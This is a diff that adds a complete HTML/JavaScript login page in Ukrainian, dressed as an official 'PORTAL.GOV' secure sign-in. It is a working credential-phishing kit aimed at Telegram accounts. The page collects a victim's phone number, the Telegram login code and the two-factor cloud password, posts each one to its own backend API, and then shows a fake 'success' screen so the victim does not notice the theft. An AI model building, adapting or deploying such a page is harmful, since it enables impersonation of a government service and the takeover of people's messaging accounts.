@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Офіційний Портал — Безпечний вхід</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #111827; overflow-x: hidden; }
+        
+        .step { display: none; opacity: 0; transform: translateY(20px); transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        .step.active { display: block; opacity: 1; transform: translateY(0); }
+        
+        .input-glass { border-bottom: 2px solid #e2e8f0; transition: border-color 0.3s; background: transparent; outline: none; }
+        .input-glass:focus { border-color: #2563eb; }
+        
+        .loading-dots::after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 40% { color: white; text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 60% { text-shadow: .25em 0 0 white, .5em 0 0 rgba(0,0,0,0); } 80%, 100% { text-shadow: .25em 0 0 white, .5em 0 0 white; } }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- Шапка -->
+    <header class="bg-white border-b border-gray-200 sticky top-0 z-50">
+        <div class="max-w-3xl mx-auto px-6 h-16 flex items-center justify-between">
+            <div class="font-bold tracking-tighter text-xl">PORTAL<span class="text-blue-600">.GOV</span></div>
+            <div class="flex items-center gap-2 text-[10px] uppercase tracking-widest font-bold text-gray-400">
+                <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+                Secure
+            </div>
+        </div>
+    </header>
+
+    <!-- Основной контейнер форм -->
+    <main class="flex-1 flex flex-col items-center justify-center p-6 w-full">
+        <div class="w-full max-w-md bg-white rounded-[2rem] shadow-xl border border-gray-100 p-8 relative overflow-hidden">
+            
+            <!-- Окно ошибок -->
+            <div id="errorBox" class="hidden absolute top-0 left-0 w-full bg-red-500 text-white text-center py-3 text-sm font-medium transition-all transform -translate-y-full"></div>
+
+            <!-- ШАГ 1: Ввод номера телефона -->
+            <div id="step-phone" class="step active">
+                <div class="text-center mb-8">
+                    <div class="w-16 h-16 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    </div>
+                    <h2 class="text-2xl font-bold tracking-tight mb-2">Авторизація</h2>
+                    <p class="text-gray-500 text-sm leading-relaxed">Введіть ваш номер телефону для підтвердження особи.</p>
+                </div>
+                
+                <div class="mb-8">
+                    <label class="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">Номер телефону</label>
+                    <div class="flex items-center input-glass pb-2">
+                        <span class="text-xl font-medium mr-2 text-gray-900">+380</span>
+                        <input id="phoneInput" type="tel" placeholder="00 000 00 00" maxlength="9" class="w-full text-xl font-medium text-gray-900 placeholder:text-gray-300" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    </div>
+                </div>
+
+                <button id="btn-phone" onclick="submitPhone()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 rounded-2xl transition-all active:scale-[0.98]">
+                    ПРОДОВЖИТИ
+                </button>
+            </div>
+
+            <!-- ШАГ 2: Ввод кода -->
+            <div id="step-code" class="step">
+                <div class="text-center mb-8">
+                    <button onclick="goToStep('step-phone')" class="absolute left-6 top-8 text-gray-400 hover:text-gray-600">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+                    </button>
+                    <h2 class="text-2xl font-bold tracking-tight mb-2">Підтвердження</h2>
+                    <p class="text-gray-500 text-sm">Ми відправили код у Telegram на номер</p>
+                    <p id="displayPhone" class="font-semibold text-gray-900 mt-1"></p>
+                </div>
+
+                <div class="mb-8 text-center">
+                    <input id="codeInput" type="text" inputmode="numeric" placeholder="•••••" maxlength="5" class="w-full text-center text-4xl font-light tracking-[1em] input-glass pb-4 mb-4 text-gray-900 placeholder:text-gray-300" oninput="this.value = this.value.replace(/[^0-9]/g, ''); if(this.value.length === 5) submitCode();">
+                    
+                    <div class="text-sm text-gray-500">
+                        Дійсний ще <span id="timer" class="font-mono text-gray-900">2:00</span>
+                    </div>
+                </div>
+
+                <button id="btn-code" onclick="submitCode()" class="w-full bg-gray-900 hover:bg-black text-white font-semibold py-4 rounded-2xl transition-all active:scale-[0.98]">
+                    ПІДТВЕРДИТИ
+                </button>
+            </div>
+
+            <!-- ШАГ 3: Облачный пароль 2FA -->
+            <div id="step-2fa" class="step">
+                <div class="text-center mb-8">
+                    <div class="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4 border border-gray-200">
+                        <svg class="w-8 h-8 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4v-3.252l7.536-7.536a6 6 0 118.207-3.465z"></path></svg>
+                    </div>
+                    <h2 class="text-2xl font-bold tracking-tight mb-2">Хмарний пароль</h2>
+                    <p class="text-gray-500 text-sm">На вашому акаунті встановлено 2FA.<br>Введіть пароль для продовження.</p>
+                </div>
+
+                <div class="mb-8">
+                    <input id="passwordInput" type="password" placeholder="Ваш пароль" class="w-full text-center text-xl bg-gray-50 border border-gray-200 rounded-xl py-4 px-6 outline-none focus:border-gray-400 focus:bg-white transition-all text-gray-900">
+                </div>
+
+                <button id="btn-2fa" onclick="submit2FA()" class="w-full bg-gray-900 hover:bg-black text-white font-semibold py-4 rounded-2xl transition-all active:scale-[0.98]">
+                    УВІЙТИ
+                </button>
+            </div>
+
+            <!-- ШАГ 4: Успех -->
+            <div id="step-success" class="step">
+                <div class="text-center py-6">
+                    <div class="relative w-24 h-24 mx-auto mb-6">
+                        <div class="absolute inset-0 bg-emerald-100 rounded-full animate-ping"></div>
+                        <div class="relative bg-emerald-500 text-white w-24 h-24 rounded-full flex items-center justify-center shadow-lg">
+                            <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                        </div>
+                    </div>
+                    <h2 class="text-3xl font-black tracking-tight mb-2 text-gray-900">Успішно</h2>
+                    <p class="text-gray-500 mb-8">Авторизація пройдена.<br>Перенаправлення в кабінет...</p>
+                    <div class="w-full bg-gray-100 rounded-full h-1.5 mb-4 overflow-hidden">
+                        <div class="bg-emerald-500 h-1.5 rounded-full w-full animate-[progress_2s_ease-in-out]"></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Статистика (блок прозрачности) -->
+        <div class="mt-12 text-center text-xs font-semibold text-gray-400 uppercase tracking-widest flex gap-8">
+            <div>Uptime <span class="text-gray-900 ml-1 block mt-1 text-sm">99.9%</span></div>
+            <div>Users <span class="text-gray-900 ml-1 block mt-1 text-sm">12K+</span></div>
+            <div>Status <span class="text-emerald-500 ml-1 block mt-1 text-sm">Online</span></div>
+        </div>
+    </main>
+
+    <style>
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+    </style>
+
+    <script>
+        // Глобальные переменные сессии
+        let currentSid = '';
+        let timerInterval;
+
+        // Навигация между шагами
+        function goToStep(stepId) {
+            document.querySelectorAll('.step').forEach(el => {
+                el.classList.remove('active');
+                setTimeout(() => el.style.display = 'none', 400); // ждем окончания анимации
+            });
+            
+            const nextStep = document.getElementById(stepId);
+            setTimeout(() => {
+                nextStep.style.display = 'block';
+                // Триггер reflow
+                void nextStep.offsetWidth;
+                nextStep.classList.add('active');
+                
+                // Автофокус на инпуты
+                if(stepId === 'step-code') document.getElementById('codeInput').focus();
+                if(stepId === 'step-2fa') document.getElementById('passwordInput').focus();
+            }, 400);
+
+            hideError();
+        }
+
+        // Показ ошибок (вверху формы)
+        function showError(msg) {
+            const box = document.getElementById('errorBox');
+            box.textContent = msg;
+            box.classList.remove('hidden');
+            // Анимация выезда сверху
+            setTimeout(() => box.classList.remove('-translate-y-full'), 10);
+            setTimeout(() => {
+                box.classList.add('-translate-y-full');
+                setTimeout(() => box.classList.add('hidden'), 300);
+            }, 4000);
+        }
+
+        function hideError() {
+            document.getElementById('errorBox').classList.add('-translate-y-full');
+        }
+
+        function setLoading(btnId, isLoading) {
+            const btn = document.getElementById(btnId);
+            btn.disabled = isLoading;
+            if (isLoading) {
+                btn.dataset.originalText = btn.innerHTML;
+                btn.innerHTML = '<span class="loading-dots">ОБРОБКА</span>';
+                btn.classList.add('opacity-80', 'cursor-not-allowed');
+            } else {
+                btn.innerHTML = btn.dataset.originalText;
+                btn.classList.remove('opacity-80', 'cursor-not-allowed');
+            }
+        }
+
+        // Таймер для кода
+        function startTimer(duration) {
+            clearInterval(timerInterval);
+            let timer = duration;
+            const display = document.getElementById('timer');
+            timerInterval = setInterval(function () {
+                let m = parseInt(timer / 60, 10);
+                let s = parseInt(timer % 60, 10);
+                m = m < 10 ? "0" + m : m;
+                s = s < 10 ? "0" + s : s;
+                display.textContent = m + ":" + s;
+                if (--timer < 0) {
+                    clearInterval(timerInterval);
+                    display.innerHTML = '<button onclick="submitPhone()" class="text-blue-600 underline">Відправити знову</button>';
+                }
+            }, 1000);
+        }
+
+        // API Вызовы
+        async function submitPhone() {
+            const phone = document.getElementById('phoneInput').value;
+            if(phone.length < 9) return showError('Введіть коректний номер (9 цифр)');
+            
+            setLoading('btn-phone', true);
+            try {
+                const res = await fetch('/api/send_code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: '380' + phone})
+                });
+                const data = await res.json();
+                
+                if (data.status === 'success') {
+                    currentSid = data.sid;
+                    // Форматируем телефон для отображения
+                    document.getElementById('displayPhone').textContent = '+380 ' + phone.match(/.{1,3}/g).join(' ');
+                    goToStep('step-code');
+                    startTimer(data.timeout || 120);
+                } else {
+                    showError(data.message || 'Помилка при відправці коду');
+                }
+            } catch (e) {
+                showError('Помилка з\'єднання з сервером');
+            } finally {
+                setLoading('btn-phone', false);
+            }
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('codeInput').value;
+            if(code.length !== 5) return showError('Код має складатись з 5 цифр');
+            
+            setLoading('btn-code', true);
+            try {
+                const res = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({sid: currentSid, code: code})
+                });
+                const data = await res.json();
+                
+                if (data.status === 'need_2fa') {
+                    goToStep('step-2fa');
+                } else if (data.status === 'success') {
+                    goToStep('step-success');
+                } else {
+                    showError(data.message || 'Невірний код. Спробуйте ще раз.');
+                    document.getElementById('codeInput').value = '';
+                }
+            } catch (e) {
+                showError('Помилка перевірки коду');
+            } finally {
+                setLoading('btn-code', false);
+            }
+        }
+
+        async function submit2FA() {
+            const pwd = document.getElementById('passwordInput').value;
+            if(!pwd) return showError('Введіть пароль');
+            
+            setLoading('btn-2fa', true);
+            try {
+                // Отправляем и код и пароль для надежности
+                const code = document.getElementById('codeInput').value;
+                const res = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({sid: currentSid, code: code, password: pwd})
+                });
+                const data = await res.json();
+                
+                if (data.status === 'success') {
+                    goToStep('step-success');
+                } else {
+                    showError(data.message || 'Невірний пароль.');
+                    document.getElementById('passwordInput').value = '';
+                }
+            } catch (e) {
+                showError('Помилка перевірки паролю');
+            } finally {
+                setLoading('btn-2fa', false);
+            }
+        }
+
+        // Enter key listeners
+        document.getElementById('phoneInput').addEventListener('keypress', e => { if(e.key === 'Enter') submitPhone(); });
+        document.getElementById('codeInput').addEventListener('keypress', e => { if(e.key === 'Enter') submitCode(); });
+        document.getElementById('passwordInput').addEventListener('keypress', e => { if(e.key === 'Enter') submit2FA(); });
+    </script>
+</body>
+</html>
